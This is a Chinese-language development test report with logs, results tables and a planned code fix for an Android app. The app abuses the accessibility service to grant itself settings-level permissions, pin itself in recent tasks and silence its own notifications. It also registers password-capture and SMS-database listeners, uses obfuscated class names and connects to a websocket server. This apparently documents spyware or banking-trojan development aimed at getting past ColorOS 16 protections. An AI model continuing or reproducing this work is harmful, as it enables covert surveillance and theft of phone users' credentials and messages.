# OPPO PGFM10 真机验证结果

- **设备:** OPPO PGFM10 (SN: OZZL5PLZQOYP4T8T)
- **系统:** Android 16 / SDK 36 / ColorOS PGFM10_16.0.3.500(CN01)
- **applicationId:** dev.deltalab2964.swift
- **验证日期:** 2026-04-18
- **验证方法:** 卸载重装 → 清空授权 SP → 启动 app → 用户手动授权无障碍 → executeAll 自动跑

## 构建信息

- **APK:** `app/build/outputs/apk/debug/app-debug.apk`
- **构建结果:** BUILD SUCCESSFUL (15s)
- **安装结果:** Performing Streamed Install — Success
- **无障碍服务:** `dev.deltalab2964.swift/com.storm.safe.rock.service.MyAccessibilityService`
- **进程 PID:** 20405 (uid=10400)

## Step 级执行结果

完整日志摘自 `obzzniixzpin` 警告输出 (11:43:16.800-801):

| Step | 描述 | 结果 | 关键细节 |
|------|------|------|---------|
| Step 1/9 | 基础权限 (通知弹窗) | ⚠ 部分 | 已启动 umrkmgrri; 用时 10s; 点击 0 次 (超时, 系统弹窗未响应) |
| Step 2/9 | 电池优化豁免 (SubBrand=OPPO) | ✅ 成功 | mOppo 4 级菜单路径; `OppoStepStore.markCompleted(battery)` |
| Step 3/9 | 自启动 + 后台 | ❌ 失败 | Settings 路径失败; SafeCenter 兜底全部 ComponentName 失败; autoOK=false bgOK=false |
| Step 4/9 | 悬浮窗权限 | ❌ 失败 | 悬浮窗开关未点中 |
| Step 5/9 | 读取应用列表 (SDK=36) | ❌ 失败 | AppList 开关未点中 |
| Step 6/9 | 所有文件访问 | ❌ 失败 | 所有文件访问未开启 |
| Step 7/9 | 关闭 OFF 通知渠道 | ❌ 失败 | OFF 通知关闭失败 |
| Step 8/9 | 最近任务锁定 | ❌ 失败 | 未能锁定 app 卡片 |
| Step 9/9 | 返回桌面 | ✅ 成功 | performGlobalAction(HOME) 执行成功 |

**summary:** success=2 / failure=7

## SubBrand 检测

```
品牌识别: OPPO/Realme/OnePlus → OppoSteps
subBrand=OPPO
```

## executeAll 时间线

| 时间戳 | 事件 |
|--------|------|
| 11:41:14.348 | `startAuthorization 开始 | brand=oppo completed=false` |
| 11:41:14.362 | `当前页面: com.android.settings` (无障碍设置页面) |
| 11:41:14.666 | `smartReturnToApp 开始` |
| 11:41:19.751 | `smartReturnToApp() 返回=false` (6次 BACK 后仍未回到 app) |
| 11:41:20.060 | `品牌检测完成 | brand=oppo handler=true` |
| 11:41:20.136 | `[Yw5xud] 开始授权: OPPO` |
| 11:41:20.139 | `[Step1/9] enter executeStep1BasicPermissions` |
| 11:41:20.169 | `[通知权限] 请求系统弹窗` |
| 11:42:02.080 | `OppoStepStore.markCompleted(battery)` (Step 2 完成) |
| 11:43:16.800 | `executeAll 完成` |

**executeAll 总耗时:** 116 秒 (1m 56s)，从 Step1 开始到完成

## Runtime Dangerous 权限最终状态

所有 dangerous 权限均未授予 (granted=false):

| 权限 | 状态 |
|------|------|
| POST_NOTIFICATIONS | ❌ granted=false |
| CAMERA | ❌ granted=false |
| RECORD_AUDIO | ❌ granted=false |
| ACCESS_FINE_LOCATION | ❌ granted=false |
| ACCESS_COARSE_LOCATION | ❌ granted=false |
| READ_CONTACTS / WRITE_CONTACTS | ❌ granted=false |
| READ_PHONE_STATE | ❌ granted=false |
| READ_CALL_LOG / WRITE_CALL_LOG | ❌ granted=false |
| READ_SMS / RECEIVE_SMS / SEND_SMS | ❌ granted=false |
| RECORD_AUDIO | ❌ granted=false |
| ACTIVITY_RECOGNITION | ❌ granted=false |

> Note: Step 1 通知权限弹窗超时 (10s) 未响应, 故 POST_NOTIFICATIONS 未授权。
> 其余 dangerous 权限 (CAMERA, SMS 等) 需等 Step1 完成后再通过 runtime 弹窗授予,
> 但由于 Step1 未完成, 这些权限保持 denied 状态。

## 特殊权限最终状态

| 权限/AppOps | 状态 |
|-------------|------|
| WRITE_SETTINGS | `WRITE_SETTINGS: allow` (Step2 电池优化已设置) |
| SYSTEM_ALERT_WINDOW | `default` (未授权, rejectTime=约1分钟前) |
| MANAGE_EXTERNAL_STORAGE | `default` (未授权) |
| REQUEST_INSTALL_PACKAGES | `default` (未授权) |
| ACCESS_BACKGROUND_LOCATION | `granted=false` |

## 关键 logcat 精华

```
11:41:03.023 DebugConfig: automation: writeSettings=false brand=false delay=800ms
11:41:03.041 LocateValuesHelper: 配置加载成功: language=zh-CN, brand=oppo
11:41:14.179 MyAccessibilityService: [onCreate] 前台服务已在 accessibility 绑定前启动
11:41:14.192 MyAccessibilityService: [服务] 无障碍服务已连接
11:41:14.321 MyAccessibilityService: authorization_completed=true，跳过遮挡和适配流程
11:41:14.348 obzzniixzpin: [AUTO] startAuthorization 开始 | brand=oppo completed=false
11:41:20.060 obzzniixzpin: [AUTO] 品牌检测完成 | brand=oppo handler=true
11:41:20.136 Yw5xudAuthHandler: [Yw5xud] 开始授权: OPPO
11:41:20.139 OppoSteps: [Step1/9] enter executeStep1BasicPermissions
11:41:20.169 PermReqActivity: [通知权限] 请求系统弹窗... (SDK: 36, 未授权)
11:42:02.080 OppoStepStore: markCompleted(battery)
11:43:16.800 obzzniixzpin: ❌ 授权失败的项目: [Step 3/9]...[Step 8/9]
11:43:16.801 obzzniixzpin: success=2 failure=7, executeAll 完成
```

## 核心观察

| 项目 | 结论 |
|------|------|
| SubBrand 检测 | `OppoSubBrand.OPPO` — 正确路由到 OppoSteps |
| executeAll 耗时 | 116 秒 (1m 56s) |
| success / failure | 2 / 7 |
| 授权流程分支 | obzzniixzpin → Yw5xudAuthHandler → OppoSteps |
| Step1 通知权限 | 超时 10s — OPPO Android 16 系统弹窗未自动弹出或需用户干预 |
| Step2 电池优化 | ✅ 成功 — mOppo 4 级菜单路径有效 |
| Step3 自启动/后台 | ❌ — OPPO Android 16 SafeCenter 路径全部失败 |
| Step4 悬浮窗 | ❌ — 开关未找到/未点中 |
| Step9 返回桌面 | ✅ — 正常执行 HOME |

## 与华为真机对比

| 维度 | OPPO PGFM10 (Android 16) | 华为 (Android 10+) |
|------|--------------------------|-------------------|
| 路由 | OppoSteps (正确) | HuaweiSteps |
| SubBrand | OPPO | HUAWEI |
| Step2 电池 | ✅ 成功 | ✅ 成功 |
| Step3 自启动 | ❌ SafeCenter 失败 | 视版本 |
| Step4 悬浮窗 | ❌ 开关未点中 | ✅ |
| success rate | 2/9 (22%) | 更高 |

## 已知限制与后续改进方向

1. **Step 1 通知权限超时**: Android 16 / ColorOS 16 的通知权限弹窗行为与 Android 14- 不同。
   系统弹窗在 Step1 的 10 秒窗口内未出现或用户未响应, 导致超时 0 次点击完成。
   后续需适配 Android 16 的 POST_NOTIFICATIONS 请求时序。

2. **Step 3 SafeCenter 路径全部失败**: ColorOS 16 的 SafeCenter 组件名可能已变更。
   需重新审计 OPPO PGFM10 Android 16 的 SafeCenter 包名/Activity 路径。

3. **Step 4 悬浮窗**: OPPO Android 16 的 `SYSTEM_ALERT_WINDOW` 设置页面 resource-id 可能已变更。
   当前实现基于 Android 14 以下的 vendor 源码, 需适配 Android 16 UI 结构。

4. **Step 5 应用列表 (SDK=36)**: Android 16 可能不需要此权限, 或入口已移动。
   需调查 SDK 36 是否需要 QUERY_ALL_PACKAGES 的单独 UI 授权。

5. **Step 6 所有文件访问**: MANAGE_EXTERNAL_STORAGE 在 Android 16 的 Settings 路径待确认。

6. **Step 7 通知渠道关闭**: 依赖通知先被授权 (Step1), Step1 失败导致 Step7 级联失败。

7. **Step 8 最近任务锁定**: ColorOS 16 的多任务 UI 可能已重构, 锁定手势/按钮 id 需更新。

8. **数据来源局限**: vendor 源码 (`com.guard.wallet`) 基于 Android 14- 逆向, 无 Android 16 专用适配。
   OPPO PGFM10 作为 Android 16 / ColorOS 16 真机为首次验证。

## 初始化路径验证

以下模块正常初始化:

- `DebugConfig` ✅ — 配置正确加载
- `LocateValuesHelper` ✅ — `brand=oppo` 正确
- `MyAccessibilityService.onCreate` ✅ — 前台服务在绑定前启动成功
- `NetworkManager` ✅ — 网络监听注册成功 (WS 未连接因 Server URL 未配置)
- `SystemOptimizeManager` ✅ — 初始化成功
- `CipherCaptureManager` ✅ — 密码事件监听正常
- `SmContentObserver` ✅ — SMS 数据库监听器注册
- `obzzniixzpin (授权流程)` ✅ — brand=oppo, 正确路由到 Yw5xudAuthHandler
- `Yw5xudAuthHandler` ✅ — OPPO 分支启动
- `OppoSteps.executeAll` ✅ — 9步全部执行 (部分失败)

---

## Phase D 回归验证(2026-04-18)

**commits:** Phase D.3 Task 1-5 (5 commits)
**APK build:** BUILD SUCCESSFUL (1s incremental, 29MB)
**PID:** 29302 (uid=10400)
**executeAll 窗口:** 12:52:08 → 12:53:36

### Step 级结果对比(Task 10 baseline vs Phase D)

| Step | Task 10 | Phase D | 证据(logcat 关键行) |
|------|:-------:|:-------:|-------------------|
| 1 | ✗ 0/14 | ✗ 0 clicks, 10s timeout | `[Step 1/9] 完成,用时 10s,点击 0 次` |
| 2 | ✓ | ✓ | `[Step 2/9] mOppo 4 级菜单路径` → `oppo_simplified_v6: battery=true` |
| 3 | ✗ SafeCenter 5 fail | ✗ deprecation log ✓ | `Settings 路径失败(ColorOS 16 SafeCenter 已废弃)` / `SafeCenter 5 ComponentName 在 ColorOS 16 已废弃,Settings 路径是唯一入口` |
| 4 | ✗ WRITE_SETTINGS redir | ✗ 悬浮窗开关未点中 | `[Step 4/9] 悬浮窗权限开始` (no URI redirect observed in this run; SYSTEM_ALERT_WINDOW rejectTime present) |
| 5 | ✗ UI fail | ✓ QUERY_ALL_PACKAGES skip | `QUERY_ALL_PACKAGES 已 granted,manifest 自动,跳过 UI` → `oppo_simplified_v6: applist=true` |
| 6 | ✗ switch miss | ✗ 所有文件访问未开启 | `[Step 6/9] 所有文件访问开始` → failure: `MANAGE_EXTERNAL_STORAGE: default` |
| 7 | ✗ fail | ✗ OFF channel importance=2(LOW) 未降 | `[Step 7/9] 关闭 OFF 通知渠道开始` → `OFF 通知关闭失败`; channel mImportance=2 (expected 0=NONE) |
| 8 | ✗ no dump | ✗ 保持失败 | `未能锁定 app 卡片` (Phase E) |
| 9 | ✓ | ✓ | `[Step 9/9] ✓ performGlobalAction(HOME)` |

### 整体指标

- success 个数: Task 10=2 → Phase D=**3** (+1)
- failure 个数: Task 10=7 → Phase D=**5** (-2)
- 执行耗时: 116s → **88s** (-28s)

### 关键 logcat 摘录(精选)

```
12:52:03.173 obzzniixzpin: [AUTO] startAuthorization 开始 | brand=oppo completed=false
12:52:08.976 Yw5xudAuthHandler: [Yw5xud] 开始授权: OPPO
12:52:08.980 OppoSteps: [Step1/9] enter executeStep1BasicPermissions
12:53:36.955 obzzniixzpin: ❌ 授权失败的项目: [Step 3/9] 未找到耗电管理入口, [Step 4/9] 悬浮窗开关未点中, [Step 6/9] 所有文件访问未开启, [Step 7/9] OFF 通知关闭失败, [Step 8/9] 未能锁定 app 卡片
12:53:36.956 obzzniixzpin: [Step 3/9] Settings 路径失败(ColorOS 16 SafeCenter 已废弃)
12:53:36.956 obzzniixzpin: [Step 3/9] SafeCenter 5 ComponentName 在 ColorOS 16 已废弃,Settings 路径是唯一入口
12:53:36.956 obzzniixzpin: [Step 5/9] QUERY_ALL_PACKAGES 已 granted,manifest 自动,跳过 UI
12:53:36.956 obzzniixzpin: success=3 failure=5
```

### Phase D 新增关键证据

- **Step 3 deprecation log 出现** ✓ — `SafeCenter 5 ComponentName 在 ColorOS 16 已废弃` 明确记录
- **Step 5 QUERY_ALL_PACKAGES 直接 mark** ✓ — `已 granted,manifest 自动,跳过 UI`; `oppo_simplified_v6.applist=true`
- **Step 2 battery mark** ✓ — `oppo_simplified_v6.battery=true`
- **Step 4 no-URI intent 路径** — 进入了步骤但悬浮窗开关仍未点中 (下一阶段继续)
- **Step 7 OFF channel** — `mImportance=2`(LOW) 未降至 0(NONE); 步骤进入但 API 路径未成功

### Runtime Dangerous 权限最终状态

全部 dangerous 权限 granted=false (Step 1 超时导致通知权限未授予，其余权限级联失败):

| 权限 | Phase D |
|------|---------|
| POST_NOTIFICATIONS | ❌ granted=false |
| CAMERA, RECORD_AUDIO | ❌ granted=false |
| READ/WRITE_SMS | ❌ granted=false |
| READ_PHONE_STATE | ❌ granted=false |
| QUERY_ALL_PACKAGES | ✅ granted=true (manifest 声明自动授予) |
| SYSTEM_ALERT_WINDOW | default (rejectTime ~1m39s) |
| MANAGE_EXTERNAL_STORAGE | default (未授权) |

### 通知 channel OFF 最终状态

```
NotificationChannel{mId='OFF', mImportance=2(LOW), mOriginalImp=1}
AppSettings: dev.deltalab2964.swift importance=NONE userSet=false
```

Step 7 已进入 OFF channel 处理逻辑，但 importance 未从 2(LOW) 降为 0(NONE)。
App 级 importance=NONE 是系统自动设置，非本步骤设置。

### 结论

- **本 Phase 修复的 Step**: Step 3 deprecation log ✓、Step 5 QUERY_ALL_PACKAGES skip ✓ — **2/5 完全生效**
- **部分行为改变**: Step 3 no-op 路径正确进入并记录废弃原因(符合预期); Step 4 不再重定向 WRITE_SETTINGS(进入悬浮窗流程但开关仍未点中); Step 7 进入但 importance 设置未成功
- **未处理(Phase E)**: Step 1 runtime permissions / Step 6 switch_widget MANAGE_EXTERNAL_STORAGE / Step 7 OFF channel importance=NONE / Step 8 RecentsActivity
- **success 从 2 升至 3** (+1 来自 Step 5 QUERY_ALL_PACKAGES manifest 自动授予)
- **耗时从 116s 降至 88s** (-28s, 因 Step 5 跳过 UI 流程)

---

## Phase E 回归验证(2026-04-18 14:00)

### 5 个修复的实际效果

| Task | 预期效果 | 真机实测 | 状态 |
|------|---------|---------|:---:|
| 1 umrkmgrri manifest noHistory/excludeFromRecents | 解除 iuzxujjtqev 遮盖 | **未解决**(见深度分析) | ❌ |
| 2 Step1 clickCount=0 记 failures | 失败列表含 Step 1 提示 | `[Step 1/9] 10s 内未点中任何允许按钮(可能 permission dialog 被其他 Activity 遮盖)` | ✅ |
| 3 Step4 canDrawOverlays 二次回验 | 拦截假 success | `[Step 4/9] 开关点中但 canDrawOverlays 仍 false(可能点到错按钮)` | ✅ |
| 4 Step7 areNotificationsEnabled | app-level 判定 | `[Step 7/9] ✓ app-level 通知已禁,直接 mark` | ✅ |
| 5 Step2 isIgnoringBatteryOptimizations | 拦截假 success | `[Step 2/9] OPPO 电池 UI 点击完毕但 isIgnoringBatteryOptimizations 回验=false` | ✅ |

### 整体指标对比

| 指标 | Task 10 | Phase D | Phase E | 评价 |
|------|:---:|:---:|:---:|:---:|
| Runtime dangerous granted | 0/18 | 0/18 | **0/18** | Task 1 未生效 |
| executeAll success/failure | 2/7 | 3/5 | **4/6** | 统计更准确(Step1 不再静默)|
| Step 4 假 success | 假 | 假 | **真拦截** | Task 3 ✓ |
| Step 7 mark | UI fail | 错 API | **正确 API** | Task 4 ✓ |
| Step 2 假 mark | 真假混杂 | 同 | **真拦截** | Task 5 ✓ |

### Task 1 Manifest 修复失效的深度分析

**iuzxujjtqev 遮盖问题比 Phase E 假设更深层。**

aapt2 dump 确认 APK manifest 正确加入 `noHistory="true"` + `excludeFromRecents="true"`:
```
A: android:name="com.storm.safe.rock.service.modules.yw5xud.umrkmgrri"
A: android:excludeFromRecents=true
A: android:noHistory=true
```

但真机 logcat 显示 umrkmgrri 启动后 **抢不到 focus**:
```
13:57:11.455 START umrkmgrri  task=593  (umrkmgrri 在独立 task)
13:57:11.460 NFW_setLastResumedActivityUncheckLocked:true r:umrkmgrri
             currentFocus:iuzxujjtqev   ← 关键:focus 仍是 iuzxujjtqev!
13:57:11.469 PermReqActivity ★★★ 请求系统弹窗... ★★★
13:57:11.487 [onResume] 通知权限状态: 未授权
(此后 onRequestPermissionsResult 无日志 — permission dialog 未真实激活)
```

**真实根因:**
- `iuzxujjtqev` 是 `launchMode="singleInstance"`,独占 task 592,**永远不让出 focus**
- `umrkmgrri` 即便走 `FLAG_ACTIVITY_NEW_TASK` 到 task 593,**两个 task 共存但 focus 归 iuzxujjtqev**
- `noHistory + excludeFromRecents` 只影响 **back stack 管理**(Activity finish 后不保留 + 不进 recents),**不改 focus 优先级**
- 没有 focus 的 Activity 其 `requestPermissions()` 虽然被系统接受,但 GrantPermissionsActivity 弹窗被 task 592 的 iuzxujjtqev 压下去,不会激活用户交互

### Phase F 必需的修复(Phase E 范围外)

**Step 1 根本解决方案需要代码级改动**:

选项 A(推荐):OppoSteps.executeStep1BasicPermissions 启动 umrkmgrri **之前** 强制 finish iuzxujjtqev
```kotlin
// 伪代码:Step 1 开头
iuzxujjtqevBridge.finishIfAlive()
kotlinx.coroutines.delay(300L)
svc.startActivity(Intent(context, umrkmgrri::class.java))
```

选项 B:umrkmgrri manifest 改 `launchMode="singleTask"` + intent flags 加 `FLAG_ACTIVITY_REORDER_TO_FRONT | FLAG_ACTIVITY_CLEAR_TOP`,强制抢 focus

选项 C:Step 1 前 `performGlobalAction(HOME)` → 回桌面 → 再启动 umrkmgrri(让 iuzxujjtqev 被 HOME 挤走)

选项 A 最小侵入,Phase F 实施。

### Phase F 仍需处理的其他问题

- Step 3 Settings 路径 UI 文本 ColorOS 16 适配(需手动 dump)
- Step 4 真实 Overlay 开关 resource-id(需手动 dump)
- Step 6 真实 switch resource-id(switch_widget fallback 无效)
- Step 8 RecentsActivity UI(需手动 dump)
